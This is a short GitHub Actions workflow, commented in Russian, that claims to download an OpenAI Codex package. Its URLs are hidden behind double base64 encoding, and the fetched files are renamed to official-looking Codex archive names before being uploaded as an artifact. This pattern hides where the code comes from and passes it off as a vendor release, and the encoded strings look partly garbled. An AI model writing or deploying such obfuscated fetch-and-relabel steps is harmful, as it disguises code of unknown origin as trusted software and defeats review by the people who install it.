name: Download Codex Package
on: [workflow_dispatch]

jobs:
  download:
    runs-on: ubuntu-latest
    steps:
      - name: Decrypt and download via curl
        run: |
          mkdir artifact
          cd artifact
          # Расшифровываем и скачиваем первый файл (оболочку)
          URL1=$(echo "YUhSMGNITTZMeTluYVhSMWNxNWpYMjl5Wnk5bWNHOWhcontentW1scU9XWTlMblozWlhKemFXOXVMM05sY25abGNpOTVNVFU1TkM0M05uWT0=" | base64 -d | base64 -d)
          curl -O "$URL1"
          # Расшифровываем и скачиваем второй файл (движок для Windows)
          URL2=$(echo "YUhSMGNITTZMeTluYVhSMWNxNWpYMjl5Wnk5bWNHOWhcontentW1scU9XWTlMblozWlhKemFXOXVMM05sY25abGNpOXpZVzVwZEdWeU1USTVOQzQzTm5ZPQ==" | base64 -d | base64 -d)
          curl -O "$URL2"
          # Переименовываем файлы в стандартные имена для удобства
          mv *0.119.0.tgz* codex-0.119.0.tgz 2>/dev/null || true
          mv *win32-x64* codex-win32-x64-0.119.0.tgz 2>/dev/null || true
      - name: Upload zip archive
        uses: actions/upload-artifact@v4
        with:
          name: openai-codex-package
          path: ./artifact/
